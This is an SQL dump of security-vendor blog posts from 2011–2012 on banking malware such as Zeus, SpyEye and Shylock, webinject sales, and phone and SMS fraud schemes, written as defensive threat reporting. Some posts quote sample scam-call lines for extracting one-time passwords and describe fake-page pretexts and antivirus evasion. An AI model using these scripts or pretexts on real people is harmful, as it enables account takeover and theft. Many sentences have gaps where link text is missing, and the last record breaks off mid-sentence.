INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (641, 'Catch Me if You Can 2012: Phishing and Malware Meet Check Fraud', 'Amit Klein', '2012-4-24', 'We recently uncovered a scam in an underground forum that shows how data obtained through phishing and malware attacks can be used to make one of the oldest forms of fraud — check forging — even harder to prevent. The scam involves a criminal selling preprinted checks linked to corporate bank accounts in the United States, United Kingdom and China. To pull off this scam, the criminal sells falsified bank checks made with specialized printing equipment, ink and paper. For $5 each, he or she will supply checks that use stolen bank account credentials provided by the buyer. However, to purchase checks that use stolen credentials supplied by the counterfeiter, the cost is $50 — a tenfold increase. This is a clear indicator that stolen credentials are a key enabler of check fraud. Check data fields include personal information (name, address and phone) and financial information (bank account, routing code and check number). To obtain all the required data, fraudsters typically need to get their hands on a physical or scanned version of a real check in circulation. Many banking websites provide access to scanned versions of paid and received checks.   obtained through   and phishing attacks can be used by fraudsters to access a victim’s account and collect all the required information to commit check fraud. In addition, before using the checks, fraudsters could potentially ensure the account balance is sufficient to approve the transaction. The criminal recommends using the checks to buy products in retail stores rather than trying to redeem them for cash. Buyers are also encouraged to carry fake identification cards that match the stolen credentials on the check; the check counterfeiter offers to provide these, as well. This is the latest example of how criminals can use malware and phishing techniques to make traditional physical fraud schemes more effective. This cross-channel approach is helping fraudsters stay one step ahead of even the most sophisticated   deployed online and in the brick-and-mortar world. It is also creating a new generation of   who are not even required to invent their own fraud scams.', '\'Banking\', \'Credentials\', \'Fraud Detection Systems\', \'Malware\', \'Online Banking\', \'Phishing\'', 'https://securityintelligence.com/catch-can-2012-phishing-malware-meet-check-fraud/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (642, 'No Reservations: Remote-Access Trojan Pilfers Credit Card Data From Hotels', 'Amit Klein', '2012-4-18', 'Our intelligence center researchers recently uncovered a fraud “package” being sold in underground forums that uses a remote-access Trojan to steal credit card information from a hotel point-of-sale (PoS) application. This scheme, which is focused on the hospitality industry, illustrates how criminals are planting   on enterprise machines to collect financial information instead of targeting end users’ devices. In this particular scenario, a remote-access Trojan program is used to infect hotel front desk computers. The   is able to steal credit card and other customer information by capturing screenshots from the  . According to the seller, the Trojan is guaranteed to be undetectable by antivirus programs. This fraud package is being offered for $280 and includes instructions on how to set up the Trojan. The sellers even offer advice on how to use telephone social engineering techniques via voice-over-IP (VoIP) software to trick front desk managers into installing the Trojan. To prove the effectiveness of the fraud package, the seller uses a screenshot (above) taken by the remote-access Trojan from the PoS system at one of the world’s largest hotel chains. The screenshot shows the PoS application populated with customer information gathered at check-in. As we have mentioned in recent posts, criminals are increasingly expanding the focus of their attacks from online banking targets to enterprises. One of the reasons for this shift is that enterprise devices can yield   when compromised.', '\'Credit Card\', \'Cybercrime\', \'Cybercriminals\', \'Fraud\', \'Malware\', \'Trojan\', \'Voice-Over-IP (VoIP)\'', 'https://securityintelligence.com/reservations-remote-access-trojan-pilfers-credit-card-data-hotels/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (643, 'Phishing for Security: Security Themed Phishing Emails', 'Amit Klein', '2012-4-15', 'plays an extremely significant role in the success of phishing attacks. As more and more users become aware of the problem, fraudsters need to find more creative ways of convincing users to surrender personal information to fraudulent websites. It seems that most fraudsters have come to the conclusion that messages crafted to address security issues stand a better chance of attracting users’ attention and gaining their trust. These phishing emails usually call for immediate action and warn users that their account will be blocked if they fail to take the required action. Here are a few examples of security-themed phishing emails: These phishing emails claim that an account has been locked or limited for security reasons until more information is provided or a  . Here are some examples: Example 1: Example 2: command-and-control (C&C) server. Fraudsters believe that by using the  , they are more likely to convince users to submit their personal information. However, some users looking at the Trusteer site may already have Trusteer Rapport on their desktop to prevent these attacks. IBM Security Trusteer provides the following protection layers: * Trusteer was acquired by IBM in 2013.', '\'Command-and-Control (C&C)\', \'Data Protection\', \'Data Security\', \'Fraud\', \'Phishing\', \'Phishing Emails\', \'Social Engineering\'', 'https://securityintelligence.com/phishing-security-security-themed-phishing-emails/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (644, 'Zeus Targets Cloud Payroll Service to Siphon Money From Enterprises', 'Amit Klein', '2012-4-10', 'With critical business services migrating to the cloud, service providers have become a prime target for cyber criminals. In the latest example of financial malware targeting enterprises, we have discovered a Zeus attack that focuses on cloud payroll service providers. These attacks are designed to route funds to criminals and bypass industrial-strength security controls maintained by larger businesses. Researchers at Trusteer, an IBM company, have captured a Zeus configuration that targets  , a Canadian human resources and payroll solutions provider. In this attack, Zeus captures a screenshot of a Ceridian payrolll services Web page when a corporate user whose machine is infected with the Trojan visits the website. This allows Zeus to steal the user ID, password, company number and the icon selected by the user for the image-based authentication system. The financial losses associated with this type of attack can be significant. Last August, cyber thieves reportedly funneled $217,000 from the Metropolitan Entertainment & Convention Authority (MECA). According to published reports, an employee at MECA was victimized by a phishing email and infected with malware that stole access credentials to the organization’s payroll system. With valid credentials, the cyber thieves were able to add fictitious employees to the MECA payroll. These money mules, who were hired through work-at-home scams, then received payment transfers from MECA’s bank account, which they sent to the fraudsters. We expect to see increased   using this type of fraud scheme for the following reasons: Unfortunately, traditional antivirus security mechanisms are largely unable to protect corporate users from becoming infected with Zeus. Attacks like this one are surgical in nature and use targeted reconnaissance combined with signature-detection-evasion techniques to get a foothold inside corporate computers. A better alternative for protecting sensitive cloud payroll, treasury and other financial applications is to prevent malware from getting to the endpoint in the first place. This requires a layered approach to security that looks for specific Crime Logic footprints — not signatures — to prevent malware on an infected machine from stealing login credentials. For example, Trusteer Rapport prevents malware from installing on a machine and secures communication between the computer and cloud service provider website to prevent common attack methods such as HTML injecting, key logging and screen capturing from grabbing data. This technology can be used to  , such as VPNs, CRM and collaboration systems that can be exploited by malware to steal user credentials and breach an enterprise’s security perimeter without being detected. We have been contacted by Ceridian requesting a clarification of the above blog post. To clarify, we note two items: First, the Zeus Trojan has been around for several years and targets a multitude of institutions and service providers, including large banks, financial institutions and possibly other payroll data-processing service providers. We take no view as to whether Ceridian is more or less secure than any of its competitors, and we do not consider other cloud payroll services providers in any way immune to such attacks. Second, the MECA intrusion noted above is an example of the financial losses that can arise from attacks on payroll systems. This is not a direct result of Ceridian having been targeted by a Zeus configuration. Indeed, we understand that MECA is not a Ceridian customer.', '\'Banking\', \'Cloud Security\', \'Cloud Services\', \'Cybercrime\', \'Cybercriminals\', \'HTML Injection\', \'Phishing\', \'Virtual Private Network (VPN)\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/zeus-targets-cloud-payroll-service-siphon-money-enterprises/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (645, 'Facebook Facelift: Ice IX Malware Injects Fake Page to Commit Credit Card Fraud', 'Amit Klein', '2012-4-3', 'Our researchers have discovered a new configuration of the Ice IX malware. It attacks Facebook users after they have logged in to their account and   credit card and other personal information. We even discovered a “marketing” video used by the creators of the malware to demonstrate how the Web injection works. The global reach and scale of the Facebook service makes it a favorite target of fraudsters. Recently, we wrote about   from Facebook users and selling bulk Facebook log-in credentials. This latest attack uses a web injection to present a fake web page in the victim’s browser. The form requests that the user provide their name, credit or debit card number, expiration date, card ID and billing address. The attackers claim the information is needed to verify the victim’s identity and provide additional security for their Facebook account. \n For anyone who believes the cyber crime economy lacks the sophistication of the legitimate economy, the following marketing video provides conclusive evidence that it does not. We discovered this video circulating in underground forums. It demonstrates in step-by-step fashion how to perform a Web inject cycle to attack Facebook users. The video begins at the Facebook log on page with the criminal logging in to a Facebook account. \n Next, the video demonstrates the pop-up created by the Web inject. This pop-up presents virtually the same message used in the Ice IX configuration our researchers discovered and analyzed. The only difference is the version in the video requests a social security number and date of birth in addition to the information mentioned earlier. In the video, the criminal fills out the fields. \n Finally, the video shows the Ice IX malware delivering the information entered in the pop-up to the fraudster’s messenger application. \n This video illustrates the seamless sophistication of pre-built Web injects that are readily available for purchase on the Internet. It also demonstrates how accomplished   are at marketing their malware products. Most of all, this attack highlights how fraudsters are branching out from their bread-and-butter online banking schemes into lateral applications with much larger user populations. By attacking Facebook and other ubiquitous  , fraudsters can tap a massive pool of victims. They can also use the information harvested from social network users to perpetuate fraud on multiple fronts, including online banking or retail, and even to  . We contacted Facebook to advise them that they would be mentioned in this blog. Facebook requested that we pass on some information about their site’s security measures. Here’s a summary of their response:', '\'Credit Card\', \'Credit Card Fraud\', \'Cybercrime\', \'Cybercriminals\', \'Facebook\', \'Malware\', \'Online Banking\', \'Personally Identifiable Information (PII)\', \'Retail\', \'Social Networks\', \'Web injects\'', 'https://securityintelligence.com/facebook-facelift-ice-ix-malware-injects-fake-page-commit-credit-card-fraud/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (646, 'Speaking With the Devil: Malware Adds Live Chat to Commit Fraud', 'Amit Klein', '2012-2-28', 'Working with a leading financial institution, IBM recently discovered a disturbing new attack against users of online banking services. It uses a technique analysts have not seen exhibited before by financial malware: It talks. Technically, it writes to you; the attack uses an online customer service tool most of us are familiar with: live chat.\n The attack is being carried out using the   platform, something that is making a comeback lately. This particular Shylock configuration uses a classic   structure with plenty of fake HTML page injections and uses complex external Javascript resources. It specifically targets business and commercial online banking customers. When the victim logs in to the online banking application, the session stalls for few minutes and the user is told that security checks are being performed. This is where things get, for lack of a better word, interesting.\n The following message is displayed in the victim’s browser:\n This Web injection is followed by an elaborate Web-chat screen, which is implemented in pure HTML and JavaScript. Within two to three minutes, if the user’s login is valid (presumably), the fraudster engages in a live online chat session with the victim. This exchange is apparently used to gather more information from the victim, and may even be used to perform real-time   by enticing the victim to verify fraudulent transactions that Shylock is initiating in the background.\n \n In 2009, RSA discovered a   that incorporated live chat. In that attack, victims were lured to a phishing site where they were presented with a fraudulent chat window. In 2012, apparently, fraudsters decided to make house calls by extending this capability from phishing websites and embedding it in malware platforms. By combining MitB techniques with the flexibility of HTML and JavaScript, criminals can now bring live chat right to your browser.\n This is yet another example of the ingenuity of fraudsters and their ability to exploit the trusting relationship between users and applications hosted by their online service providers. This attack could conceivably be used against enterprises and their employees, with the attacker posing as an IT help desk technician.\n What’s clear now is that the barbarians are taking control of the browser. To prevent malware from getting onto the endpoint in the first place, the browser needs a layer of   that is on par with the protection afforded to networks, databases, servers and access devices.', '\'JavaScript\', \'Online Banking\', \'Phishing\', \'Shylock\'', 'https://securityintelligence.com/speaking-with-the-devil-malware-adds-live-chat-to-commit-fraud/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (647, 'Merchant of Fraud Returns: Shylock Polymorphic Financial Malware Infections on the Rise', 'Amit Klein', '2012-2-15', 'Last September, we blogged about a new polymorphic financial malware variant we had discovered. We code-named it “Shylock” because every new build bundles random excerpts from William Shakespeare’s “The Merchant of Venice” in its binary. These are designed to change the malware’s file signature to avoid detection by antivirus programs and  .   In recent weeks, we have seen a significant increase in the number of end-user machines infected with Shylock. One of this malware’s distinguishing characteristics is its ability to almost completely avoid detection by antivirus scanners after installation. Shylock uses a unique three-step process to evade scanners:  injects itself into all running processes (applications) in memory. Every time a new application is initialized, Shylock suspends the application from running in memory, injects itself into the application process and then allows the application to proceed with its normal execution. Once installed, Shylock code doesn’t run as a separate process; rather, it embeds itself within every genuine application running on a machine. This makes it very hard to detect. Moreover, even if Shylock is detected, the fact that it is embedded in multiple running applications makes it almost impossible to stop and remove from memory. Shylock looks for and intercepts operations related to directory browsing and enumeration of registry keys, which indicate an antivirus scanning operation is underway. Once it detects “scanning” activity, Shylock deletes its own files and registry entries, making it undetectable. It remains active only in memory. Entries in the operating system registry allow malware (like any application or process) to execute its files as part of the start-up processes. Once Shylock has removed its files and registry entries to avoid being detected by an antivirus scan, it cannot survive a system shutdown/reboot. Any of these actions would remove it from memory and eliminate the infection. To ensure its survival, Shylock hooks into the Windows shutdown procedure and reinstates the files and registry keys (previously removed in Step 2) just before the system is completely shut down and after all applications are closed, including   applications. We have found that physically unplugging the machine’s power source (assuming it does not have an internal battery) after Shylock has deleted its files and registry entries to evade detection will clean the memory and also the Shylock infection. Needless to say, we do not recommend this as a malware-removal practice.', '\'Antivirus\', \'Financial Malware\', \'Malware\', \'Malware Injection\', \'Operating System (OS)\', \'Shylock\', \'Threat Detection\', \'Windows\'', 'https://securityintelligence.com/merchant-of-fraud-returns-shylock-polymorphic-financial-malware-infections-on-the-rise/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (648, 'Fraudsters Selling Login Credentials for Facebook, Twitter in Bulk', 'Amit Klein', '2012-2-8', 'Researchers at IBM have discovered two cyber crime rings that are advertising what we refer to as a “factory outlet” of login credentials for different websites, including Facebook, Twitter and a leading website administration software called cPanel.\n Once it infects a machine, financial malware is configured to attack specific online banking websites. In addition to online banking credentials, the malware also captures login credentials used by the victim’s machine to access other websites and Web applications.\n To monetize the login credentials that pile up, fraudsters have started setting up factory outlets to sell them off.\n In the advertisement below, cyber criminals are offering to   to social networking sites that belong to users from all over the world. These can be purchased in bulk from specific countries (e.g., the United States, United Kingdom and Germany) and can even be coupled with additional personal information, such as email addresses.\n \n Although these advertisements do not mention the number of infected machines, the   claim that they have 80 GB of stolen data from victims.\n In another so-called “credential factory outlet sale” advertisement, a botnet operator offers to sell login and URL information that would allow a fraudster to take control of certain websites. Specifically, the advertiser is offering cPanel credentials. cPanel is the leading control panel application used to manage hosted websites.\n Why would somebody want to buy credentials to manage someone else’s website remotely? One possible reason could be to plant malicious code on these sites to exploit   and infect machines through drive-by downloads. Using phishing emails and social network messages, cyber criminals can lure unsuspecting users to these sites, a common practice. Some cyber criminals have set up networks of websites loaded with exploit code and sell malware for drive-by download infections in bulk.\n This latest development provides a window into the vast cyber crime aftermarket that has risen on the Internet, which is made possible by sophisticated malware. Whether it’s bulk drive-by download infections, bulk login credentials or pre-built webinjects, criminals today have an unprecedented arsenal of tools at their disposal to attack banks and enterprises.\n A layered approach to   that includes deterministic detection capabilities on the endpoint is now central to  . This approach looks for specific malware crime logic footprints in real time before transactions are submitted, so the online banking application can block fraud. It can also prevent malware on an infected machine from stealing login credentials, thus preventing them from ending up in the newly opened criminal factory outlets.\n We contacted Facebook, Twitter and cPanel to advise them that they would be mentioned in this blog. Facebook requested that we pass on some information about its security measures. Here is a summary of the company’s response:', '\'Credentials\', \'Cybercrime\', \'Facebook\', \'Financial Malware\', \'Malware\', \'Online Banking\', \'Phishing\', \'Twitter\'', 'https://securityintelligence.com/fraudsters-selling-login-credentials-for-facebook-twitter-in-bulk/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (649, 'Ice IX Malware Redirects Bank Phone Calls to Attackers', 'Amit Klein', '2012-2-1', 'IBM research has discovered a concerning development in some new Ice IX configurations that are targeting online banking customers in the U.K. and U.S. Ice IX is a modified variant of the   platform.\n In addition to stealing bank account data, these configurations are capturing information on victims’ telephone accounts. This allows attackers to divert calls from the bank that were intended for its customers to attacker-controlled phone numbers. The fraudsters are presumably executing fraudulent transactions using the stolen credentials and redirecting the bank’s post-transaction verification phone calls to professional criminal caller services that approve the transactions.\n In one attack captured by IBM researchers, at the point of login the malware steals the victim’s user ID and password as well as the answers to the user’s memorable information/secret question, date of birth and account balance.\n Next, victims are asked to update their recorded phone numbers (home, mobile and work) and select the name of their service provider from a drop-down list. In this particular attack, the three most popular phone service providers in the U.K. are presented: British Telecommunications (BT), TalkTalk and Sky. Here’s an example of the webinjection the user sees in his or her browser:\n \n To enable the attacker to modify the victim’s phone service settings, the   then asks the victim to submit his or her telephone account number. This is very private and sensitive data — typically only known to the phone subscriber and the phone company — and is used by the phone company to verify the identity of the subscriber and authorize sensitive account modifications such as call forwarding. The fraudsters justify this request by stating that the information is required as part of a verification process caused by “a malfunction of the bank’s anti-fraud system with its landline phone service provider.”\n Here are the webinject messages presented to BT, Sky and TalkTalk users:\n \n \n \n Fraudsters are increasingly turning to these post-transaction attack methods to hide   from the victim and block email and phone communication from the bank. This allows attackers to circumvent security mechanisms that look for anomalies once transactions have already been executed by the user.\n Deterministic detection security mechanisms, like  , search for specific malware crime logic footprints before transactions are submitted and allow the online banking application to stop fraud by changing business flows (block money transfers, decline/add payee, limit amounts, etc.). Uniquely, they are not vulnerable to post-transaction attacks.\n Thanks to Tanya Shafir from the IBM analysis team for providing the intelligence for this post.', '\'Credentials\', \'Financial Malware\', \'Ice IX\', \'Malware\', \'Password\', \'webinject\', \'Zeus\'', 'https://securityintelligence.com/ice-ix-malware-redirects-bank-phone-calls-to-attackers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (650, 'Carberp Steals e-Cash Vouchers From Facebook Users', 'Amit Klein', '2012-1-18', 'Recently, IBM Security came across a new configuration of the   that targets Facebook users to commit  . Unlike previous Facebook attacks designed to steal user credentials from the login page, this version attempts to steal money by duping the user into divulging an e-cash voucher. Carberp replaces any Facebook page the user navigates to with a fake page that notifies the victim that his or her Facebook account is temporarily locked. The page asks users for their first name, last name, email, date of birth, password and a Ukash 20-euro (approximately $25) voucher number to confirm verification of their identity and unlock the account. The page claims the cash voucher will be added to the user’s main Facebook account balance, which is obviously not the case. Instead, the voucher number is transferred to the Carberp botmaster, who presumably uses it as a cash equivalent (Ukash provides anonymity similar to that offered by cash payments), thus effectively defrauding the user of 20 euros, or $25. This clever   the trust users have with Facebook and the anonymity of e-cash vouchers. Unlike attacks against online banking applications, which require transferring money to another account and creates an auditable trail, this new Carberp attack allows fraudsters to immediately use or sell the e-cash vouchers anywhere they are accepted on the Internet. Attacking social networks such as Facebook provides cyber criminals with a large pool of victims who can be easily tricked into divulging confidential account information and, as illustrated in this case, giving up their cash. With the growing adoption of e-cash on the Internet, we expected to see more of these attacks. Like card-not-present fraud, where cyber criminals use stolen debit and credit card information to make illegal purchases online without the risk of being caught, e-cash fraud is a low-risk form of crime. With e-cash, however, it is the account holder, not the financial institution, who assumes the liability for fraudulent transactions. To end users, we recommend — as always — to be suspicious of odd or unconventional requests, even when they seem to originate from a trusted website. Also, consider using browser-based   such as IBM Security Trusteer Rapport, which secures communication between the computer and target website to block MitB attack methods such as HTML injections and prevents key-logging from grabbing data.', '\'Carberp\', \'Carberp Trojan\', \'Credentials\', \'Cybercrime\', \'Cybercriminals\', \'Facebook\', \'Financial Fraud\', \'Fraud\', \'HTML Injection\', \'Malware\', \'Man-in-the-Browser (MitB) Malware\', \'Online Banking\', \'Social Networks\', \'Trojan\'', 'https://securityintelligence.com/carberp-steals-e-cash-vouchers-facebook-users/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (651, 'Get Safe Online by Protecting Yourself Offline', 'Amit Klein', '2011-11-8', 'As part of this week’s Get Safe Online campaign in the United Kingdom, IBM Security Trusteer has issued a warning that using fraudulent phone calls to commit   is an increasingly popular tactic among the criminal community. It is possible that cyber criminals are using fraudulent calls to pull off online scams. When they place these bogus bank calls, fraudsters need credibility to fool their victims into giving up account information. They therefore use information they have already collected through malware to lull their targets into a false sense of security, collecting the rest of the information they need to complete their scam directly from the target. Everyone should be on their guard to avoid falling victim on or offline. The phenomenon of stealing data through one channel, such as the Web, and using it in a different channel or context, such as a   attack, is often overlooked. IBM has found that data collected by   (MitB) attacks can be used for purposes other than automated transaction fraud. In order to get safe online and defend against the new wave of hybrid scams, banks must apply technology to   from MitB malware while users maintain vigilance of online services. Traditional   fraud starts by identifying the targeted bank and learning how their online banking service functions. Once fraudsters understand the banking and security processes, they design a scheme and configure a corresponding malware attack (e.g., a MitB security training scam). Finally, bank clients are infected with the malware, which starts its execution sequence. Other forms of financial malware fraud work in reverse. First, malware placed on a victim’s machine logs online activity and banking credentials. Fraudsters use credential data phished from malware logs to access online banking sites and perpetrate fraud. IBM has even identified fraudsters selling   logs on the open market. The going price is between 60 cents to one dollar per gigabyte. The problem with this method is, in many cases, the data collected by the malware is insufficient to commit the actual fraud. The one-time password (OTP) authentication credentials originally collected are no longer valid. In addition, banks require transaction signing to transfer money and additional authentication data when logging in from a new IP address. Fraudsters can use professional caller services to obtain the missing data required to complete a successful online scam. A forum advertisement discovered by IBM offers a phone service with professional callers fluent in English and other European languages who can impersonate male and female, as well as old and young, voices. Operational since 2009, the service offers calls to private customers, banks, shops, post offices and any other organizations a customer specifically wants to contact during American or European business hours. They’ll even prepare the phone numbers to accept calls in case victims should want to call back for any reason. The price is a rather reasonable $10 per call. Although the actual callers’ scripts are not shared in the forum advertisement, we can imagine scripts used to collect the missing data would look something like this:  The caller uses data collected by the malware to gain credibility. For example, the caller would ask “Are you John Smith, living at such-and-such address, with credit card number ending in 2345?  Once the caller has established credibility, he or she goes on to collect the SMS OTP, for example “We have just sent you an SMS with an OTP so we can make sure you are John Smith, can you please read it for me?” Then, the caller collects any other additional authentication information, for example “For verification, can you please give me the last four digits of your social security number? Finally, the caller can even get the user to generate a transaction-signing code with fraudulent payee and amount information, for example “We need to calibrate your transaction-signing reader, so could you please enter the following details online and then tell us what happens?” While everyone’s attention is focused on protecting themselves in the virtual world, they’re still very much at risk back here in the real world. Fraudsters are turning to phone call services in an endeavor to trick people into disclosing their confidential information, sourcing professional callers to impersonate representatives from financial organizations. The sad truth is that it is actually far easier to perpetrate social engineering over the phone than many realize. It’s rather disturbing how professional the group’s marketing is. It claims to have extensive experience working with bank customers, banks and shops. It even highlights their financial expertise, bragging that in the majority of cases they complete bank transfers and transactions. For individuals, IBM advises the following:', '\'Financial Fraud\', \'Financial Malware\', \'Fraud\', \'Malware\', \'Man-in-the-Browser (MitB)\', \'Online Banking\', \'Online Banking Fraud\', \'Social Engineering\', \'United Kingdom\', \'Zeus\'', 'https://securityintelligence.com/get-safe-online-by-protecting-yourself-offline/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (652, 'When Refrigerators Attack! The Future of Smart Grid Security', 'Chris Poulin', '2011-11-2', 'INT CAR — MORNING A man is stuck in traffic on his way to work. His mind wanders and his OCD kicks in: Did I leave the toaster plugged in? He pulls out his smart phone and taps the app labeled “Home Automation”, then taps “Kitchen” and “Toaster” from another list including “Stove”, “Lights”, and “Refrigerator”. The screen shows that the toaster is off and the temperature is 70°, the same as the ambient temperature of the kitchen. The man rolls his eyes and grins at his obsessive concern. INT. KITCHEN — SAME DAY & TIME PAN AROUND KITCHEN Pandemonium. The refrigerator is shooting ice cubes across the room into the glassware rack. The freezer is off and food is thawing; the refrigeration section’s temperatures is cranked up to disco and is turning into an iceberg. The dishwasher is overflowing and suds are 10″ deep on the kitchen floor. A ZoomBot bumps against the pastry rack, sending the smoking toaster inch by inch toward the towel rack and curtains. That’s the scene I painted at the   and will be presenting at the   in November. Okay, so the scenario is a disaster straight from a movie plot, but is it Stephen King’s  , where you have to suspend disbelief as animated trucks take over the world, or a Jules Verne future prediction? There are plenty of utility system compromises to alarm not only consumers, but security experts and government agencies: And let’s not forget Stuxnet More to the point of smart grid security,  . In real life, a similar worm or bot would give the herder the ability to wreak havoc on consumers, and possibly even the electric grid itself. Imagine if the worm/bot sent false usage information demanding more power to an electric sector and caused an overload leading to a  . Granted, a systemic failure is theoretical, as is the kitchen pandemonium scene. In truth no one really knows what the smart grid will eventually look like or what the specific threats may be. The smart grid is like The Cloud: still evolving and amorphous. What we do know, however, is that utility companies are not used to thinking in terms of data security; they’ve been historically concerned with the protection of hardware like transformer stations, utility poles, and electric wires, as well as consumer fraud. Now they’ll have to change their mindset to protecting not only billing information and traditional PII, but surveillance information that can let burglars know to target homes where the electric consumption drops for a few days, a clue that the homeowners are away on holiday or visiting sick Aunt Bertha, or even when you run your electric shaver or  . One way or another, your electricity provider or 3  party monitoring company will have access to your home area network to monitor and control your smart appliances. It won’t be long before attackers discover this path into your house and that your home automation system is connected to everything: it dims the lights and closes the blinds when you turn on the television and lights up the gas fireplace when you play soft rock. Perhaps you have one of those   jacked in, the ones that automatically raise the toilet seat and activate a bidet arm after you flush. Or maybe you just have your dishwasher, toaster, and refrigerator connected.', 'None', 'https://securityintelligence.com/when-refrigerators-attack-the-future-of-smart-grid-security/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (653, 'Webinjects for Sale on the Underground Market', 'Amit Klein', '2011-11-2', 'Cyber criminals have been busy developing webinjects for Zeus and SpyEye to orchestrate and develop   against certain brands. Webinjects are malware configuration directives that are used to inject rogue content into the Web pages of bank websites to steal confidential information from the institution’s customers. It’s not a contained problem, as IBM has discovered that these webinjects are being offered for sale on the online underground market. Investigations reveal that these shrewd developers are earning a decent income from selling the Zeus/SpyEye webinject services to an increasingly diverse customer base. The really interesting element is that they’re not too concerned whether the customer has the skills to use it. In fact, they’d probably prefer that they didn’t since the developers have gone to the trouble of obfuscating the Zeus/SpyEye webinjects not because they want to confuse malware researchers, but because they want to prevent the piracy of their software. This means, ironically, that these criminals are actually taking steps to protect their own intellectual property — I suppose they have to do something since they can’t resort to litigation. Because webinjects can’t be modified by customers, if they need localization for a specific country and language, this can only be carried out by the developers, who are only too willing to do so — for a price: However, resale is rife. Those who have purchased a copy of webinject are openly reselling their version to anyone that wants to steal the same information from victims: From the advertisements we’ve seen, there are multiple targets, including British, Canadian, American and German banks. The prospective customer can see a detailed description of the type of information that can be stolen from each brand, almost like ordering from a catalog. Worryingly, the prices are pretty reasonable. According to the website advertisements: These prices are in WebMoney/Liberty Reserve units (1 WMZ/LR is equivalent to 1 USD). On one of the forums, we even found an advertisement for the large pack of webinjects (19 MB) being sold for just $15-20: Anyone with malevolent intentions and a bit of spare cash can bag themselves a bargain on the underground market — you’ve been warned.', '\'SpyEye\', \'underground market\', \'Zeus\'', 'https://securityintelligence.com/webinjects-for-sale-on-the-underground-market/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (654, 'SpyEye Changes Phone Numbers to Hijack Out-of-Band SMS Security', 'Amit Klein', '2011-10-5', 'The research team at IBM recently uncovered a stealthy new attack carried out by the   that circumvents mobile SMS security measures implemented by many banks. Using code we captured while protecting an   user, we discovered a two-step web-based attack that allows fraudsters to change the mobile phone number in a victim’s online banking account and reroute SMS confirmation codes used to verify online transactions. This attack, when successful, enables the thieves to make transactions on the user’s account and confirm the transactions without the user’s knowledge. In the first step of the attack, SpyEye steals the victim’s online banking login details. This is standard operating procedure for   like SpyEye, Zeus and others. The fraudsters can now access the victim’s account without raising any fraud-detection systems’ red flags. In step two, SpyEye changes the victim’s phone number of record in the online banking application to one of several random attacker-controlled numbers. In order to complete this operation, the attacker needs the confirmation code, which is sent by the bank to the customer’s original phone number. To steal this confirmation code, the attacker uses the following social engineering scheme. First, SpyEye injects a fraudulent page into the customer’s browser that appears to be from the online banking application. The fake page purports to introduce a new security system that is now “required” by the bank for which customers must register. The page explains that under this new security process the customer will be assigned a unique telephone number and that they will receive a special SIM card via mail. Next, the user is instructed to enter the personal confirmation number they receive on their mobile telephone into the fake web page in order to complete the registration process for the new security system. This allows the criminals to steal the confirmation code they need to authorize changing the customer’s mobile number. The following is a screen shot of the fraudulent page created by SpyEye that is presented to the customer (translated from Spanish to English): Now the fraudsters can receive all future SMS transaction verification codes for the hijacked account via their own telephone network. This allows them to use the SMS confirmation system to divert funds from the customer’s account without their knowledge, while not triggering any   alarms. This latest SpyEye configuration demonstrates that out-of-band authentication (OOBA) systems, including SMS-based solutions, are not foolproof. Using a combination of Man in the Browser (MitB) injection technology and social engineering, fraudsters can not only bypass OOBA but also buy themselves more time, since the transactions have been verified and fly under the radar of fraud-detection systems. The only way to defeat this new SMS security attack once a computer has been infected with SpyEye is by using endpoint security that blocks MitB techniques. Without a  , even the most sophisticated OOBA schemes can be made irrelevant under the right circumstances.', '\'Financial Malware\', \'Fraud Detection Systems\', \'Malware\', \'Man-in-the-Browser (MitB)\', \'SMS\', \'SpyEye\', \'Trojan\', \'Zeus\'', 'https://securityintelligence.com/spyeye-changes-phone-numbers-to-hijack-out-of-band-sms-security/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (655, 'Fictitious Transfers Are Latest Bank Heist', 'Amit Klein', '2011-9-20', 'In an effort to validate and secure financial transactions, a number of banks are using transaction verification systems. The belief is that even if malware manages to change transaction details on the fly, the customer has an out-of-band channel to verify that it has not been modified. The practice assumes that it will prevent a bank heist if   cannot infect the out-of-band channel, and therefore the bank or the customer will be able to detect fraudulent transfers. There are different types of transaction verification systems. The two most common are: However, the assumption that malware cannot influence the out-of-band channel is flawed. The easiest way to defeat transaction verification systems is using social engineering attacks. IBM has seen a number of different variants against transaction verification systems over the years. Now the company has encountered a new scenario that it believes is very interesting. The following attack is conducted by SpyEye against a Spanish bank. Using  , fraudsters first gain control over the Web channel. This means any information that customers view inside the browser while connected to their bank can be modified by the fraudsters. Unfortunately, customers viewing this information are usually unable to distinguish between services delivered by the bank and those that are in fact modified by malware. This gives fraudsters the ability to launch extremely effective social engineering attacks. In the attack analysts have recently seen, fraudsters were simply waiting for customers to log in to their bank’s website. The criminal then changed the content of the post-login page to a message informing customers of an upgraded security system. They’re invited to undergo a training process that promises to help them deal with the bank’s upgraded security system. As part of the training, users are asked to make a transfer to a fictitious bank account and confirm the transaction using the confirmation code that is sent by the bank to the registered  . Fraudsters claim that the users’ accounts will not be debited and the recipient’s account is fabricated. Of course, the bank heist then happens, the money is transferred and the criminal disappears off into the sunset. The text of the post-login page is below. This and many other social engineering attacks against 